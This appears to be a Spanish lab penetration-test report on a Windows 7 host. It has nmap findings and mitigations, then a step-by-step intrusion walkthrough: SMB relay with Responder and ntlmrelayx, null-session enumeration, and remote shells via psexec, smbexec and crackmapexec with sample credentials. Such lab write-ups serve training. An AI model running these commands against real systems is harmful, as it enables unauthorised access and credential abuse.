# Informe de Reconocimiento y Enumeración: Windows 7 Professional

## 1. Información del Objetivo y Superficie de Ataque
*   **Dirección IP:** `192.168.0.11`
*   **Dirección IP Kali (Predator):** `192.168.0.5`
*   **Sistema Operativo:** Windows 7 Professional 7601 Service Pack 1 (EOL - Sin Soporte)
*   **Configuración Crítica:** SMBv2 Message Signing: **Disabled** (Vulnerable a SMB Relay)
*   **Acceso Inicial:** Cuenta `guest` habilitada / Permite Null Sessions

---
para enumerar use el comando nmap -sV -sC -p- -T4 -Pn 192.168.0.11
## 2. Resultados del Escaneo de Red (Nmap)

### Resumen de Puertos Abiertos

| Puerto | Protocolo | Servicio | Observaciones |
| :--- | :--- | :--- | :--- |
| **135** | tcp | msrpc | Microsoft Windows RPC |
| **139** | tcp | netbios-ssn | Servicio de sesión NetBIOS |
| **445** | tcp | microsoft-ds | SMB (Server Message Block) |
| **49152-49157** | tcp | msrpc | Servicios RPC dinámicos |

### Análisis de Scripts de Nmap
El escaneo revela configuraciones específicas en el protocolo SMB:
*   **message_signing: disabled:** La firma de mensajes SMB no está requerida.
*   **account_used: guest:** El sistema permite cierta visibilidad mediante acceso de invitado.
*   **OS Discovery:** Confirmación de Windows 7 SP1 (Build 7601).

---

## 3. Identificación de Vulnerabilidades y Riesgos

### 3.1. Ciclo de Vida del Producto (End of Life)
El sistema operativo Windows 7 alcanzó el fin de su vida útil (EOL) en enero de 2020. 
*   **Riesgo:** Crítico. Al no recibir actualizaciones de seguridad, el sistema es susceptible a vulnerabilidades conocidas que no tienen parches oficiales disponibles, facilitando el compromiso del host.

### 3.2. Debilidad en la Configuración de SMB
La ausencia de requerimientos para la firma de mensajes SMB (`message_signing: disabled`) representa una vulnerabilidad de red significativa.
*   **Riesgo:** Alto. Esta configuración permite la interceptación y manipulación de tráfico en la red local. Es un vector común para técnicas de "Man-in-the-Middle" y retransmisión de autenticación, donde un tercero puede capturar y utilizar desafíos de red para obtener acceso no autorizado a recursos compartidos o servicios del sistema.

---

## 4. Metodología de Auditoría y Enumeración

Para un análisis detallado de la superficie de exposición, se consideran los siguientes vectores de evaluación:

### A. Diagnóstico de Protocolos de Red
El uso de herramientas de diagnóstico permite observar cómo el sistema responde a solicitudes de resolución de nombres (LLMNR/NetBIOS). En entornos vulnerables, el sistema puede intentar autenticarse automáticamente ante servicios desconocidos si la configuración de red no está endurecida.

### B. Enumeración de Recursos Compartidos
Dada la visibilidad del puerto 445 y el acceso de invitado, es posible realizar una enumeración de directorios para identificar información sensible expuesta.
*   **Herramientas recomendadas:** Utilidades estándar de administración de red para listar recursos compartidos (`shares`) y políticas de contraseñas.
*   **Objetivo:** Verificar si existen carpetas con permisos de lectura/escritura abiertos para usuarios no autenticados.

---

## 5. Recomendaciones de Mitigación
1.  **Actualización de Sistema:** Migrar a una versión de Windows con soporte vigente (Windows 10/11 o Windows Server) para recibir parches de seguridad críticos.
2.  **Endurecimiento de SMB:** Habilitar la firma de mensajes SMB (SMB Signing) mediante políticas de grupo (GPO) para prevenir ataques de retransmisión.
3.  **Desactivación de Protocolos Heredados:** Deshabilitar LLMNR y NBT-NS si no son estrictamente necesarios para reducir la superficie de envenenamiento de red.
4.  **Restricción de Accesos:** Deshabilitar la cuenta de invitado y restringir el acceso anónimo a los recursos compartidos del sistema.


# Reconocimiento, Enumeración e Intrusión en Windows 7 Professional

---

## 2. Fase de Intrusión 1: Ataque de SMB Relay (MitM)

Al tener la firma SMB deshabilitada, se interceptan las peticiones de red generadas por el envenenamiento de LLMNR/NetBIOS y se retransmiten hacia el objetivo para obtener acceso directo.

### Paso 1: Configurar el Receptor de Retransmisión (Kali Linux)
Prepara el script de Impacket para escuchar conexiones NTLM entrantes de la red local y retransmitirlas hacia la IP de la víctima. La bandera `-i` generará una sesión interactiva en caso de éxito.

```bash
impacket-ntlmrelayx -t 192.168.0.11 -smb2support -i
```

### Paso 2: Ejecutar el Envenenamiento de Red con Responder
Fuerza al tráfico de la red a redirigirse a tu Kali abusando de las solicitudes de resolución de nombres que genera la víctima (LLMNR/NBT-NS).

```bash
sudo responder -I eth0 -dwv
```

*Nota del laboratorio:* En la salida de tu consola se observa que la víctima `192.168.0.11` ya está enviando peticiones de red envenenadas (`Poisoned answer sent to 192.168.0.11 for name windows7`). Tan pronto como un usuario administrador de la red intente autenticarse, `ntlmrelayx` abrirá una shell en el puerto local `11000`.

### Paso 3: Conectarse a la Shell Interactiva
Una vez que el relay capture y valide la autenticación, conéctate al puerto local abierto en Kali para tomar el control de la consola del sistema objetivo:

```bash
nc 127.0.0.1 11000
```

---

## 3. Fase de Intrusión 2: Enumeración Agresiva y Explotación Null Sessions

Si el ataque de red no es viable de inmediato, se explotan los puertos abiertos `135`, `139` y `445` usando las credenciales por defecto o nulas permitidas por el sistema.

### Vector A: Recopilación Total con Enum4linux
Extrae la lista completa de usuarios del sistema, políticas de contraseñas, grupos de trabajo y recursos compartidos disponibles.

```bash
enum4linux -a 192.168.0.11
```

### Vector B: Interfección de RPC (Remote Procedure Call)
Abre una consola interactiva en el puerto 135 sin proporcionar contraseñas (Null Session) para interrogar a la base de datos de usuarios (SAM):

```bash
rpcclient -U "" -N 192.168.0.11
```
*Comandos internos para ejecutar una vez dentro de la sesión `rpcclient>`:*
```bash
querydominfo      # Obtener el SID y datos del dominio/grupo
enumdomusers      # Listar nombres exactos de los usuarios del sistema
netshareenumall   # Listar rutas de carpetas del sistema remoto
```

### Vector C: Abuso de SMB para Exfiltración y Movimiento Lateral
Verifica si existen carpetas compartidas sin restricciones (como `C$`, `ADMIN$` o carpetas compartidas por usuarios) y conéctate de forma anónima.

```bash
# 1. Listar recursos compartidos en modo silencioso
smbclient -L //192.168.0.11/ -N

# 2. Conectarse al recurso compartido identificado (Ej: una carpeta llamada 'Compartida')
smbclient //192.168.0.11/Compartida -N
```

---

## 4. Fase de Intrusión 3: Ganar Ejecución de Comandos Post-Enumeración

Si durante la fase anterior lograste recuperar credenciales válidas (o tras romper un hash obtenido por Responder usando `john` o `hashcat`), utilizas protocolos legítimos de Windows para ejecutar comandos remotamente de forma interactiva.

### Opción A: Ejecución mediante CrackMapExec (Modo Masivo)
```bash
# Comprobar si las credenciales son de Administrador y ejecutar un comando de prueba
crackmapexec smb 192.168.0.11 -u 'Administrador' -p 'Password123' -x 'whoami'
```

### Opción B: Obtención de Shell del Sistema con Psexec
Genera un servicio remoto con privilegios de `NT AUTHORITY\SYSTEM` (Máximo control).

```bash
impacket-psexec WORKGROUP/Administrador:Password123@192.168.0.11
```

### Opción C: Ejecución Limpia vía Smbexec
Alternativa que no deja binarios ejecutables alojados en el disco del objetivo, evadiendo posibles detecciones básicas.

```bash
impacket-smbexec WORKGROUP/Administrador:Password123@192.168.0.11
```
